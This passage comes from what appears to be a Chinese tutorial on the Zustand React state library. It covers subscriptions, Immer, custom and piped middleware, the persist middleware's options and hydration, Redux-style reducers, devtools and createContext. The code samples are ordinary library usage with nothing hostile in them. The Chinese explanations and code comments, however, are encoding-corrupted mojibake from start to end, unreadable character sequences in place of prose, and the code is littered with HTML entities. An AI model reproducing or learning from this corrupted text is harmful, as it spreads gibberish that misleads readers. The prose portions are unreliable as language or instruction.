fireImmediately: true })   3. è®¢é˜…å¤„ç†å™¨ï¼ˆä¸­é—´ä»¶ï¼‰ä½¿ç”¨TS import create, { GetState, SetState } from \u0026#39;zustand\u0026#39;\rimport { StoreApiWithSubscribeWithSelector, subscribeWithSelector } from \u0026#39;zustand/middleware\u0026#39;\rtype BearState = {\rpaw: boolean\rsnout: boolean\rfur: boolean\r}\rconst useStore = create\u0026lt;\rBearState,\rSetState\u0026lt;BearState\u0026gt;,\rGetState\u0026lt;BearState\u0026gt;,\rStoreApiWithSubscribeWithSelector\u0026lt;BearState\u0026gt;\r\u0026gt;(subscribeWithSelector(() =\u0026gt; ({ paw: true, snout: true, fur: true }))) ä¹ã€ç¬æ—¶æ›´æ–°refï¼ˆç”¨äºé¢‘ç¹å‘ç”Ÿçš„çŠ¶æ€å˜åŒ–ï¼‰ è®¢é˜…åŠŸèƒ½å…è®¸ç»„ä»¶ç»‘å®šåˆ°stateï¼Œè€Œæ— éœ€åœ¨æ›´æ”¹æ—¶å¼ºåˆ¶é‡æ–°æ¸²æŸ“ã€‚ æœ€å¥½å°†å®ƒä¸ useEffect ç»“åˆä½¿ç”¨ï¼Œä»¥ä¾¿åœ¨å¸è½½æ—¶è‡ªåŠ¨å–æ¶ˆè®¢é˜…ã€‚ å½“ç›´æ¥æ”¹å˜è§†å›¾æ—¶ï¼Œè¿™ä¼šå¯¹æ€§èƒ½äº§ç”Ÿå·¨å¤§å½±å“ã€‚\nconst useStore = create(set =\u0026gt; ({ girlNum: 0, ... }))\rfunction Component() {\r// è·å–åˆå§‹çŠ¶æ€\rconst girlNumRef = useRef(useStore.getState().girlNum)\r// åœ¨æŒ‚è½½æ—¶è¿æ¥åˆ°Storeï¼Œåœ¨å¸è½½æ—¶æ–­å¼€è¿æ¥ï¼Œåœ¨å¼•ç”¨æ—¶æ•è·çŠ¶æ€å˜åŒ–\ruseEffect(() =\u0026gt; useStore.subscribe(\rstate =\u0026gt; (girlNumRef.current = state.girlNum)\r), []) åã€æ›´æ–°åµŒå¥—çš„çŠ¶æ€ï¼Œä½¿ç”¨ Immer åµŒå¥—ç»“æ„ä»¤äººåŒçƒ¦ã€‚ å¯ä»¥ä½¿ç”¨ Immer å¤„ç†æ·±å±‚åµŒå¥—çš„state\nimport produce from \u0026#39;immer\u0026#39;\rconst useStore = create(set =\u0026gt; ({\rlush: { forest: { contains: { a: \u0026#34;bear\u0026#34; } } },\rclearForest: () =\u0026gt; set(produce(state =\u0026gt; {\rstate.lush.forest.contains = null\r}))\r}))\rconst clearForest = useStore(state =\u0026gt; state.clearForest)\rclearForest(); åä¸€ã€ä¸­é—´ä»¶ 1. æŒ‰è‡ªå·±å–œæ¬¢çš„æ–¹å¼ç®¡ç†store 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  // è®°å½•æ¯æ¬¡æ”¹å˜çš„state const log = config =\u0026gt; (set, get, api) =\u0026gt; config(args =\u0026gt; { console.log(\u0026#34; applying\u0026#34;, args) set(args) console.log(\u0026#34; new state\u0026#34;, get()) }, get, api) // å°† set æ–¹æ³•å˜æˆä¸€ä¸ª immer proxy const immer = config =\u0026gt; (set, get, api) =\u0026gt; config((partial, replace) =\u0026gt; { const nextState = typeof partial === \u0026#39;function\u0026#39; ? produce(partial) : partial return set(nextState, replace) }, get, api) const useStore = create( log( immer((set) =\u0026gt; ({ bees: false, setBees: (input) =\u0026gt; set((state) =\u0026gt; void (state.bees = input)), })), ), )   2. ç®¡ç†ä¸­é—´ä»¶ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  import create from \u0026#34;zustand\u0026#34; import produce from \u0026#34;immer\u0026#34; import pipe from \u0026#34;ramda/es/pipe\u0026#34; /* ä¸Šä¸€ä¸ªä¾‹å­ä¸­çš„æ—¥å¿—å’Œimmerå‡½æ•° */ /* é€šè¿‡pipeé›†åˆä»»æ„æ•°é‡çš„ä¸­é—´ä»¶ */ const createStore = pipe(log, immer, create) const useStore = createStore(set =\u0026gt; ({ bears: 1, increasePopulation: () =\u0026gt; set(state =\u0026gt; ({ bears: state.bears + 1 })) })) export default useStore   3. åœ¨ç®¡ç†ä¸­é—´ä»¶ä¸­ä½¿ç”¨TS yarn add --dev @types/ramda 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  import create from \u0026#34;zustand\u0026#34; import { devtools, redux } from \u0026#34;zustand/middleware\u0026#34; import pipe from \u0026#34;ramda/es/pipe\u0026#34; const log: typeof devtools = config =\u0026gt; (set, get, api) =\u0026gt; config( args =\u0026gt; { console.log(\u0026#34; applying\u0026#34;, args) set(args) console.log(\u0026#34; new state\u0026#34;, get()) }, get, api ) export type State = { grumpiness: number } const initialState: State = { grumpiness: 0, } const createStore = pipe(redux, devtools, log, create) enum types { increase = \u0026#34;INCREASE\u0026#34;, decrease = \u0026#34;DECREASE\u0026#34;, } const reducer = ( state: State, { type, by = 1 }: { type: types; by: number } ) =\u0026gt; { switch (type) { case types.increase: return { grumpiness: state.grumpiness + by } case types.decrease: return { grumpiness: state.grumpiness - by } } } const useStore = createStore(reducer, initialState) export default useStore   åäºŒã€çŠ¶æ€æŒä¹…åŒ–ä¸­é—´ä»¶ persist å¯ä»¥å­˜å‚¨ä»»ä½•ç±»å‹çš„storeæ•°æ®ã€‚ï¼ˆlocalStorageï¼ŒAsyncStorageï¼ŒIndexedDBï¼Œç­‰\u0026hellip;ï¼‰\n1. å¿«é€Ÿç¤ºä¾‹ import create from \u0026#34;zustand\u0026#34;\rimport { persist } from \u0026#34;zustand/middleware\u0026#34;\rexport const useStore = create(persist(\r(set, get) =\u0026gt; ({\rcount: 0,\rplus: () =\u0026gt; set({ count: get().count + 1 })\r}),\r{\rname: \u0026#34;count-storage\u0026#34;, // å”¯ä¸€çš„åç§°\rgetStorage: () =\u0026gt; sessionStorage, // ï¼ˆå¯é€‰ï¼‰é»˜è®¤æƒ…å†µä¸‹ï¼Œä½¿ç”¨â€œlocalStorageâ€\r}\r)) 2. é€‰é¡¹   name è¿™æ˜¯å”¯ä¸€éœ€è¦çš„é€‰é¡¹ã€‚ç»™å®šçš„åç§°å°†æ˜¯ç”¨äºå­˜å‚¨stateçš„é”®ï¼Œå› æ­¤å®ƒå¿…é¡»æ˜¯å”¯ä¸€çš„ã€‚\n  getStorage é»˜è®¤ï¼š () =\u0026gt; localStorage\n  ç»™å®šçš„å­˜å‚¨å¿…é¡»ä¸ä»¥ä¸‹æ¥å£åŒ¹é…ï¼š\n1 2 3 4 5 6  interface Storage { getItem: (name: string) =\u0026gt; string | null | Promise\u0026lt;string | null\u0026gt; setItem: (name: string, value: string) =\u0026gt; void | Promise\u0026lt;void\u0026gt; removeItem: (name: string) =\u0026gt; void | Promise\u0026lt;void\u0026gt; }   serializeï¼ˆåºåˆ—åŒ–ï¼‰   Schema: (state: Object) =\u0026gt; string | Promise\u0026lt;string\u0026gt; Default: (state) =\u0026gt; JSON.stringify(state)  ç”±äºå°†å¯¹è±¡å­˜å‚¨åœ¨ storage ä¸­çš„å”¯ä¸€æ–¹æ³•æ˜¯é€šè¿‡å­—ç¬¦ä¸²ï¼Œå¯ä»¥ä½¿ç”¨æ­¤é€‰é¡¹æä¾›è‡ªå®šä¹‰å‡½æ•°å°† state åºåˆ—åŒ–ä¸ºå­—ç¬¦ä¸²ã€‚\nä¾‹å¦‚ï¼Œå¦‚æœæ‚¨æƒ³å°† state å­˜å‚¨åœ¨ base64 ä¸­ï¼š\nexport const useStore = create(persist(\r(set, get) =\u0026gt; ({\r// ...\r}),\r{\r// ...\rserialize: (state) =\u0026gt; btoa(JSON.stringify(state)),\r}\r)) è¯·æ³¨æ„ï¼Œè¿˜éœ€è¦ä¸€ä¸ªè‡ªå®šä¹‰deserializeå‡½æ•°æ‰èƒ½ä½¿å…¶æ­£å¸¸å·¥ä½œã€‚è§ä¸‹æ–‡\ndeserialize ï¼ˆååºåˆ—åŒ–ï¼‰   Schema: (str: string) =\u0026gt; Object | Promise\u0026lt;Object\u0026gt; Default: (str) =\u0026gt; JSON.parse(str)  å¦‚æœä½¿ç”¨è‡ªå®šä¹‰åºåˆ—åŒ–å‡½æ•°ï¼Œåˆ™å¾ˆå¯èƒ½è¿˜éœ€è¦ä½¿ç”¨è‡ªå®šä¹‰ååºåˆ—åŒ–å‡½æ•°ã€‚å®ƒä»¬æ˜¯ä¸€å¯¹æ­æ¡£ã€‚\nè¦ç»§ç»­ä¸Šé¢çš„ç¤ºä¾‹ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ååºåˆ—åŒ– base64 å€¼ï¼š\nexport const useStore = create(persist(\r(set, get) =\u0026gt; ({\r// ...\r}),\r{\r// ...\rdeserialize: (str) =\u0026gt; JSON.parse(atob(str)),\r}\r)) partialize (åˆå§‹åŒ–éƒ¨åˆ†state)   Schema: (state: Object) =\u0026gt; Object Default: (state) =\u0026gt; state  å®ƒå¤Ÿçœç•¥ä¸€äº›è¦å­˜å‚¨åœ¨ storage ä¸­çš„ state å­—æ®µã€‚\nå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•çœç•¥å¤šä¸ªå­—æ®µï¼š\nexport const useStore = create(persist(\r(set, get) =\u0026gt; ({\rfoo: 0,\rbar: 1,\r}),\r{\r// ...\rpartialize: (state) =\u0026gt;\rObject.fromEntries(\rObject.entries(state).filter(([key]) =\u0026gt; ![\u0026#34;foo\u0026#34;].includes(key))\r),\r}\r)) æˆ–è€…åªå…è®¸å­˜å‚¨ç‰¹å®šstateå­—æ®µï¼š\nexport const useStore = create(persist(\r(set, get) =\u0026gt; ({\rfoo: 0,\rbar: 1,\r}),\r{\r// ...\rpartialize: (state) =\u0026gt; ({ foo: state.foo })\r}\r)) onRehydrateStorage ï¼ˆæ°´å’Œå­˜å‚¨ï¼‰   Schema: (state: Object) =\u0026gt; ((state?: Object, error?: Error) =\u0026gt; void) | void  æ­¤é€‰é¡¹èƒ½å¤Ÿåœ¨æ°´åˆå­˜å‚¨æ—¶è°ƒç”¨çš„ä¾¦å¬å™¨å‡½æ•°ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  export const useStore = create(persist( (set, get) =\u0026gt; ({ // ...  }), { // ...  onRehydrateStorage: (state) =\u0026gt; { console.log(\u0026#34;hydration starts\u0026#34;); //æ°´åˆå¼€å§‹ \t// å¯é€‰  return (state, error) =\u0026gt; { if (error) { console.log(\u0026#34;an error happened during hydration\u0026#34;, error) //æ°´åˆè¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯  } else { console.log(\u0026#34;hydration finished\u0026#34;) //æ°´åˆå®Œæˆ  } } } } ))   version æŒ‡å®šå­˜å‚¨ç‰ˆæœ¬   Schema: number Default: 0  å¦‚æœåœ¨ storage ä¸­å¼•å…¥é‡å¤§æ›´æ”¹ï¼ˆä¾‹å¦‚é‡å‘½åå­—æ®µï¼‰ï¼Œå¯ä»¥æŒ‡å®šæ–°ç‰ˆæœ¬å·ã€‚\né»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœ storage ä¸­çš„ç‰ˆæœ¬ä¸ä»£ç ä¸­çš„ç‰ˆæœ¬ä¸åŒ¹é…ï¼Œåˆ™ä¸ä¼šä½¿ç”¨ storage çš„å€¼ã€‚\næœ‰å…³å¤„ç†é‡å¤§æ›´æ”¹çš„æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…ä¸‹é¢çš„é€‰é¡¹migrate\nmigrate ç‰ˆæœ¬è¿ç§»   Schema: (persistedState: Object, version: number) =\u0026gt; Object | Promise\u0026lt;Object\u0026gt; Default: (persistedState) =\u0026gt; persistedState  å¯ä»¥ä½¿ç”¨æ­¤é€‰é¡¹æ¥å¤„ç†ç‰ˆæœ¬è¿ç§»ã€‚migrate å‡½æ•°å°†æŒä¹…åŒ–stateå’Œç‰ˆæœ¬å·ä½œä¸ºå‚æ•°ã€‚\nå®ƒå¿…é¡»è¿”å›ç¬¦åˆæœ€æ–°ç‰ˆæœ¬ï¼ˆä»£ç ä¸­çš„ç‰ˆæœ¬ï¼‰çš„stateã€‚\nä¾‹å¦‚ï¼Œå¦‚æœè¦é‡å‘½åå­—æ®µï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  export const useStore = create(persist( (set, get) =\u0026gt; ({ newField: 0, // å‡è®¾è¯¥å­—æ®µåœ¨ç‰ˆæœ¬ 0 ä¸­ä»¥å…¶ä»–æ–¹å¼å‘½å  }), { // ...  version: 1, // å¦‚æœ storage ä¸­çš„ç‰ˆæœ¬ä¸æ­¤è¿ç§»ä¸åŒ¹é…ï¼Œåˆ™ä¼šè§¦å‘ï¼š  migrate: (persistedState, version) =\u0026gt; { if (version === 0) { // å¦‚æœå­˜å‚¨çš„å€¼åœ¨ç‰ˆæœ¬ä¸º 0 ï¼Œåˆ™å°†è¯¥å­—æ®µé‡å‘½åä¸ºæ–°åç§°  persistedState.newField = persistedState.oldField; delete persistedState.oldField; } return persistedState; }, } ))   merge åˆå¹¶å­˜å‚¨å€¼å’Œstate    Schema: (persistedState: Object, currentState: Object) =\u0026gt; Object\n  Default: (persistedState, currentState) =\u0026gt; ({ ...currentState, ...persistedState })\n  åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¸Œæœ›ä½¿ç”¨è‡ªå®šä¹‰åˆå¹¶å‡½æ•°å°†æŒä¹…å€¼ä¸å½“å‰çŠ¶æ€åˆå¹¶ã€‚\né»˜è®¤æƒ…å†µä¸‹ï¼Œä¸­é—´ä»¶è¿›è¡Œæµ…åˆå¹¶ã€‚å¦‚æœéƒ¨åˆ†æŒä¹…åŒ–äº†åµŒå¥—å¯¹è±¡ï¼Œé‚£ä¹ˆæµ…å±‚åˆå¹¶å¯èƒ½è¿˜ä¸å¤Ÿã€‚\nä¾‹å¦‚ï¼Œå¦‚æœå­˜å‚¨åŒ…å«ä»¥ä¸‹å†…å®¹ï¼š\n{\rfoo: {\rbar: 0,\r}\r} ä½†æ˜¯ä½ çš„ Zustand store åŒ…å«:\n{\rfoo: {\rbar: 0,\rbaz: 1,\r}\r} æµ…åˆå¹¶å°†ä»å¯¹è±¡ foo ä¸­æ“¦é™¤ baz å­—æ®µã€‚è§£å†³æ­¤é—®é¢˜çš„ä¸€ç§æ–¹æ³•æ˜¯æä¾›è‡ªå®šä¹‰æ·±åº¦åˆå¹¶åŠŸèƒ½ï¼š\nexport const useStore = create(persist(\r(set, get) =\u0026gt; ({\rfoo: {\rbar: 0,\rbaz: 1,\r},\r}),\r{\r// ...\rmerge: (persistedState, currentState) =\u0026gt; deepMerge(currentState, persistedState),\r}\r)) 3. API persist api ä½¿ React ç»„ä»¶çš„å†…éƒ¨æˆ–å¤–éƒ¨ä¸æŒä¹…ä¸­é—´ä»¶è¿›è¡Œå¤§é‡äº¤äº’ã€‚\n setOptions æ›´æ”¹ä¸­é—´ä»¶é€‰é¡¹   Schema: (newOptions: PersistOptions) =\u0026gt; void  æ­¤æ–¹æ³•èƒ½å¤Ÿæ›´æ”¹ä¸­é—´ä»¶é€‰é¡¹ã€‚è¯·æ³¨æ„ï¼Œæ–°é€‰é¡¹å°†ä¸å½“å‰é€‰é¡¹åˆå¹¶ã€‚\nä¾‹å¦‚ï¼Œè¿™å¯ç”¨äºæ›´æ”¹ storage åç§°ï¼š\nuseStore.persist.setOptions({\rname: \u0026#34;new-name\u0026#34;\r}); ç”šè‡³æ›´æ”¹ storage å¼•æ“ï¼š\nuseStore.persist.setOptions({\rgetStorage: () =\u0026gt; sessionStorage,\r}); clearStorage   Schema: () =\u0026gt; void  è¿™å¯ç”¨äºå®Œå…¨æ¸…é™¤ storage ä¸­çš„æŒä¹…å€¼ã€‚\nuseStore.persist.clearStorage(); rehydrate è§¦å‘æ°´åˆ   Schema: () =\u0026gt; Promise\u0026lt;void\u0026gt;  åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¯èƒ½å¸Œæœ›æ‰‹åŠ¨è§¦å‘æ°´åˆã€‚å¯ä»¥é€šè¿‡è°ƒç”¨è¯¥rehydrateæ–¹æ³•æ¥å®Œæˆã€‚\nawait useStore.persist.rehydrate(); hasHydrated è·å–æ°´åˆçŠ¶æ€   Schema: () =\u0026gt; boolean  è¿™æ˜¯ä¸€ä¸ªReactçš„ getterï¼Œç”¨äºäº†è§£å­˜å‚¨æ˜¯å¦å·²è¢«æ°´åˆï¼ˆè¯·æ³¨æ„ï¼Œåœ¨è°ƒç”¨useStore.persist.rehydrate()æ—¶ä¼šæ›´æ–°ï¼‰ã€‚\nuseStore.persist.hasHydrated(); onHydrate æ°´åˆè¿‡ç¨‹å¼€å§‹   Schema: (listener: (state) =\u0026gt; void) =\u0026gt; () =\u0026gt; void  æ°´åˆè¿‡ç¨‹å¼€å§‹æ—¶å°†è°ƒç”¨ç»™å®šçš„ä¾¦å¬å™¨ã€‚\n1 2 3 4 5 6 7  const unsub = useStore.persist.onHydrate((state) =\u0026gt; { console.log(\u0026#34;hydration starts\u0026#34;); }); // ç¨å... unsub();   onFinishHydration æ°´åˆè¿‡ç¨‹ç»“æŸ   Schema: (listener: (state) =\u0026gt; void) =\u0026gt; () =\u0026gt; void  å½“æ°´åŒ–è¿‡ç¨‹ç»“æŸæ—¶ï¼Œå°†è°ƒç”¨ç»™å®šçš„ä¾¦å¬å™¨ã€‚\n1 2 3 4 5 6 7  const unsub = useStore.persist.onFinishHydration((state) =\u0026gt; { console.log(\u0026#34;hydration finished\u0026#34;); }); // ç¨å... unsub();   4. æ°´åˆå’Œå¼‚æ­¥å­˜å‚¨ è¦è§£é‡Šå¼‚æ­¥å­˜å‚¨çš„â€œæˆæœ¬â€æ˜¯ä»€ä¹ˆï¼Œéœ€è¦äº†è§£ä»€ä¹ˆæ˜¯æ°´åˆä½œç”¨ï¼ˆhydrationï¼‰ã€‚\n1). ä»€ä¹ˆæ˜¯æ°´åˆhydrationï¼Ÿ ç®€è€Œè¨€ä¹‹ï¼Œæ°´åˆæ˜¯ä» storage ä¸­æ£€ç´¢æŒä¹…çŠ¶æ€å¹¶å°†å…¶ä¸å½“å‰çŠ¶æ€åˆå¹¶çš„è¿‡ç¨‹ã€‚\npersist ä¸­é—´ä»¶æ‰§è¡Œä¸¤ç§ æ°´åˆhydrationï¼šåŒæ­¥å’Œå¼‚æ­¥ã€‚\nå¦‚æœç»™å®šçš„å­˜å‚¨æ˜¯åŒæ­¥çš„ï¼ˆä¾‹å¦‚localStorageï¼‰ï¼Œæ°´åˆå°†åŒæ­¥å®Œæˆï¼Œå¦‚æœç»™å®šçš„å­˜å‚¨æ˜¯å¼‚æ­¥çš„ï¼ˆä¾‹å¦‚AsyncStorageï¼‰ï¼Œæ°´åˆå°†å¼‚æ­¥å®Œæˆ\u0026hellip;\u0026hellip;ğŸ¥ã€‚\nä½†é—®é¢˜æ˜¯ä»€ä¹ˆï¼Ÿ åœ¨åŒæ­¥æ°´åˆä¸­ï¼ŒZustand åœ¨åˆ›å»º store æ—¶è¿›è¡Œæ°´åˆã€‚åœ¨å¼‚æ­¥æ°´åˆä¸­ï¼ŒZustand store å°†åœ¨ç¨åçš„å¾®ä»»åŠ¡ä¸­æ°´åˆã€‚\nä¸ºä»€ä¹ˆè¿™æœ‰å…³ç³»ï¼Ÿ å¼‚æ­¥æ°´åˆå¯èƒ½ä¼šå¯¼è‡´ä¸€äº›æ„å¤–è¡Œä¸ºï¼ˆæˆæœ¬æ‰€åœ¨ï¼‰ã€‚ä¾‹å¦‚ï¼Œ\nå¦‚æœåœ¨ React åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨ Zustandï¼Œstore å°†ä¸ä¼šåœ¨åˆå§‹æ¸²æŸ“æ—¶æ°´åˆã€‚\nå¦‚æœåº”ç”¨ç¨‹åºä¾èµ–äºé¡µé¢åŠ è½½æ—¶çš„æŒä¹…å€¼ï¼Œä½ å¯èƒ½å¸Œæœ›ç­‰åˆ° store å·²è¢«æ°´åˆåå†æ˜¾ç¤ºå†…å®¹\nï¼ˆä¾‹å¦‚ï¼Œåº”ç”¨ç¨‹åºå¯èƒ½è®¤ä¸ºç”¨æˆ·æœªç™»å½•ï¼Œå› ä¸ºè¿™æ˜¯é»˜è®¤å€¼ï¼Œè€Œå®é™…ä¸Š store è¿˜æ²¡æœ‰è¢«æ°´åˆï¼‰ã€‚\n2). å¦‚ä½•æ£€æŸ¥ store æ˜¯å¦å·²æ°´åˆ æœ‰å‡ ç§ä¸åŒçš„æ–¹æ³•å¯ä»¥åšåˆ°è¿™ä¸€ç‚¹ã€‚\nfn1. å¯ä»¥ä½¿ç”¨onRehydrateStorageé€‰é¡¹æ¥æ›´æ–° store ä¸­çš„å­—æ®µï¼š\nconst useStore = create(\rpersist(\r(set, get) =\u0026gt; ({\r// ...\r_hasHydrated: false\r}),\r{\r// ...\ronRehydrateStorage: () =\u0026gt; () =\u0026gt; {\ruseStore.setState({ _hasHydrated: true })\r}\r}\r)\r);\rexport default function App() {\rconst hasHydrated = useStore(state =\u0026gt; state._hasHydrated);\rif (!hasHydrated) {\rreturn \u0026lt;p\u0026gt;Loading...\u0026lt;/p\u0026gt;\r}\rreturn (\r// ...\r);\r} fn2. è¿˜å¯ä»¥åˆ›å»ºè‡ªå®šä¹‰useHydrationhookï¼š\nconst useStore = create(persist(...))\rconst useHydration = () =\u0026gt; {\rconst [hydrated, setHydrated] = useState(useStore.persist.hasHydrated)\ruseEffect(() =\u0026gt; {\rconst unsubHydrate = useStore.persist.onHydrate(() =\u0026gt; setHydrated(false)) // Note: this is just in case you want to take into account manual rehydrations. You can remove this if you don\u0026#39;t need it/don\u0026#39;t want it.\rconst unsubFinishHydration = useStore.persist.onFinishHydration(() =\u0026gt; setHydrated(true))\rsetHydrated(useStore.persist.hasHydrated())\rreturn () =\u0026gt; {\runsubHydrate()\runsubFinishHydration()\r}\r}, [])\rreturn hydrated\r} 5. å¦‚ä½•ä½¿ç”¨è‡ªå®šä¹‰å­˜å‚¨å¼•æ“ï¼Ÿ å¦‚æœè¦ä½¿ç”¨çš„å­˜å‚¨ä¸é¢„æœŸçš„ API ä¸åŒ¹é…ï¼Œå¯ä»¥åˆ›å»ºè‡ªå·±çš„å­˜å‚¨ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  import create from \u0026#34;zustand\u0026#34; import { persist, StateStorage } from \u0026#34;zustand/middleware\u0026#34; import { get, set, del } from \u0026#39;idb-keyval\u0026#39; // å¯ä»¥ä½¿ç”¨ä»»ä½•ä¸œè¥¿ï¼šIndexedDBã€Ionic Storage ç­‰  // è‡ªå®šä¹‰ storage å¯¹è±¡ const storage: StateStorage = { getItem: async (name: string): Promise\u0026lt;string | null\u0026gt; =\u0026gt; { console.log(name, \u0026#34;has been retrieved\u0026#34;); return (await get(name)) || null }, setItem: async (name: string, value: string): Promise\u0026lt;void\u0026gt; =\u0026gt; { console.log(name, \u0026#34;with value\u0026#34;, value, \u0026#34;has been saved\u0026#34;); await set(name, value) }, removeItem: async (name: string): Promise\u0026lt;void\u0026gt; =\u0026gt; { console.log(name, \u0026#34;has been deleted\u0026#34;); await del(name) } } export const useStore = create(persist( (set, get) =\u0026gt; ({ fishes: 0, addAFish: () =\u0026gt; set({ fishes: get().fishes + 1 }) }), { name: \u0026#34;food-storage\u0026#34;, //å”¯ä¸€åç§°  getStorage: () =\u0026gt; storage, } ))   åä¸‰ã€åƒ Redux ä¸€æ ·ç¼–å†™ä»£ç  const types = { increase: \u0026#34;INCREASE\u0026#34;, decrease: \u0026#34;DECREASE\u0026#34; }\rconst reducer = (state, { type, by = 1 }) =\u0026gt; {\rswitch (type) {\rcase types.increase: return { grumpiness: state.grumpiness + by }\rcase types.decrease: return { grumpiness: state.grumpiness - by }\r}\r}\rconst useStore = create(set =\u0026gt; ({\rgrumpiness: 0,\rdispatch: args =\u0026gt; set(state =\u0026gt; reducer(state, args)),\r}))\rconst dispatch = useStore(state =\u0026gt; state.dispatch)\rdispatch({ type: types.increase, by: 2 }) æˆ–è€…ï¼Œåªéœ€ä½¿ç”¨redux-middlewareã€‚\nå®ƒè¿æ¥ä½ çš„main-reducerï¼Œè®¾ç½®åˆå§‹ stateï¼Œå¹¶å‘ state æœ¬èº«å’Œ vanilla api æ·»åŠ ä¸€ä¸ªdispatchå‡½æ•°ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  import React, { useEffect } from \u0026#39;react\u0026#39; import ReactDOM from \u0026#39;react-dom\u0026#39; import create from \u0026#39;zustand\u0026#39; import { devtools, redux } from \u0026#39;zustand/middleware\u0026#39; import \u0026#39;./styles.css\u0026#39; const initialState = { count: 0 } const types = { increase: \u0026#39;INCREASE\u0026#39;, decrease: \u0026#39;DECREASE\u0026#39; } const reducer = (state, { type, by }) =\u0026gt; { switch (type) { case types.increase: return { count: state.count + by } case types.decrease: return { count: state.count - by } default: return } } const [useStore, api] = create( // å°† store è¿æ¥åˆ° devtools  // å¦‚æœæ²¡æœ‰ reducers å’Œ action-typesï¼Œä½ ä¼šçœ‹åˆ°â€œsetStateâ€è¢«æ³¨é”€  devtools( // å°†æˆ‘ä»¬çš„ store è½¬æ¢ä¸º redux action dispatcher ...  // å‘ store æ·»åŠ ä¸€ä¸ª dispatch æ–¹æ³•  redux(reducer, initialState) ) ) function Counter() { const count = useStore(state =\u0026gt; state.count) useEffect(() =\u0026gt; { // Increase  setTimeout(() =\u0026gt; api.dispatch({ type: types.increase, by: 3 }), 1000) // Decrease  setTimeout(() =\u0026gt; api.dispatch({ type: types.decrease, by: 1 }), 2000) // Decrease  setTimeout(() =\u0026gt; api.dispatch({ type: types.decrease, by: 1 }), 3000) }, []) return \u0026lt;span class=\u0026#34;header\u0026#34;\u0026gt;{count}\u0026lt;/span\u0026gt; } ReactDOM.render(\u0026lt;Counter /\u0026gt;, document.getElementById(\u0026#39;root\u0026#39;))   åå››ã€åœ¨ React äº‹ä»¶å¤„ç†ç¨‹åºä¹‹å¤–è°ƒç”¨ actions å¦‚æœåœ¨ React äº‹ä»¶å¤„ç†ç¨‹åºä¹‹å¤–è°ƒç”¨setStateï¼Œå®ƒä¼šåŒæ­¥å¤„ç†ã€‚\nåœ¨äº‹ä»¶å¤„ç†ç¨‹åºä¹‹å¤–æ›´æ–°çŠ¶æ€å°†å¼ºåˆ¶ react åŒæ­¥æ›´æ–°ç»„ä»¶ï¼Œå› æ­¤å¢åŠ äº†é‡åˆ°åƒµå°¸å­æ•ˆåº”çš„é£é™©ã€‚\nä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œéœ€è¦å°† actions åŒ…è£¹åœ¨unstable_batchedUpdatesä¸­ã€‚\nimport { unstable_batchedUpdates } from \u0026#39;react-dom\u0026#39; // or \u0026#39;react-native\u0026#39;\rconst useStore = create((set) =\u0026gt; ({\rfishes: 0,\rincreaseFishes: () =\u0026gt; set((prev) =\u0026gt; ({ fishes: prev.fishes + 1 }))\r}))\rconst nonReactCallback = () =\u0026gt; {\runstable_batchedUpdates(() =\u0026gt; {\ruseStore.getState().increaseFishes()\r})\r} åäº”ã€ä½¿ç”¨ Redux å¼€å‘å·¥å…· 1 2 3 4 5 6 7 8 9  import { devtools } from \u0026#39;zustand/middleware\u0026#39; // ä½¿ç”¨æ™®é€šæ“ä½œå­˜å‚¨ï¼Œå®ƒå°†è®°å½•æ“ä½œä¸ºâ€œsetStateâ€ // devtools å°†åªè®°å½•æ¥è‡ªæ¯ä¸ªå•ç‹¬å­˜å‚¨çš„æ“ä½œï¼Œè¿™ä¸å…¸å‹çš„ redux å­˜å‚¨ä¸åŒ const useStore = create(devtools(store)) // ä½¿ç”¨ redux å­˜å‚¨ï¼Œå®ƒå°†è®°å½•å®Œæ•´æ“ä½œç±»å‹ const useStore = create(devtools(redux(reducer, initialState)))   Name store: devtools(store, {name: \u0026quot;MyStore\u0026quot;})ï¼Œè¿™å°†åœ¨ devtools ä¸­åˆ›å»ºä¸€ä¸ªåä¸ºâ€œMyStoreâ€çš„å•ç‹¬å®ä¾‹ã€‚\nåºåˆ—åŒ–é€‰é¡¹ï¼šdevtools(store, { serialize: { options: true } })ã€‚\nåå…­ã€React context store create ä¸éœ€è¦ä¸Šä¸‹æ–‡æä¾›ç¨‹åºï¼ˆcontext providersï¼‰ã€‚\nåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œä½ å¯èƒ½å¸Œæœ›ä½¿ç”¨ä¸Šä¸‹æ–‡è¿›è¡Œä¾èµ–æ³¨å…¥ï¼Œæˆ–è€…å¦‚æœä½ æƒ³ä½¿ç”¨ç»„ä»¶ä¸­çš„ props åˆå§‹åŒ– storeã€‚\nå› ä¸º store æ˜¯ä¸€ä¸ªé’©å­ï¼ŒæŠŠå®ƒä½œä¸ºä¸€ä¸ªæ™®é€šçš„ä¸Šä¸‹æ–‡å€¼ä¼ é€’å¯èƒ½ä¼šè¿åé’©å­çš„è§„åˆ™ã€‚\nä¸ºäº†é¿å…è¯¯ç”¨ï¼Œæä¾›äº†ä¸€ä¸ªç‰¹æ®ŠcreateContextã€‚\n1. åˆ›å»º createContext import create from \u0026#39;zustand\u0026#39;\rimport createContext from \u0026#39;zustand/context\u0026#39;\rconst { Provider, useStore } = createContext()\rconst 